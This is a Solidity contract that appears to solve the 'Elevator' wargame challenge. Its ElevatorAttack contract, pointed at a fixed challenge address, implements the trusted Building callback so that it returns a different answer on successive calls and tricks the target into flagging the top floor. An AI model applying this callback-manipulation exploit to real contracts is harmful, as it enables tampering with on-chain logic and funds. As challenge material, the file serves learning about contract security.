// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface Elevator {
  function goTo(uint _floor) external;
}

contract ElevatorAttack is Building {
    uint private constant FLOORS = 2;
    uint public lastFloor = 0;

    Elevator challenge = Elevator(0x2D6A5080ce3cae117203Dc616a493d42435785d9);
    
    function isLastFloor(uint _floor) public override returns (bool) {
        _floor;
        return FLOORS < lastFloor++;
    }

    // Call this function three times, on the third call it
    // show cause the `top` variable in the super Building 
    // to become `true`.
    function moveToFloor(uint _floor) public {
        challenge.goTo(_floor);        
    }
}

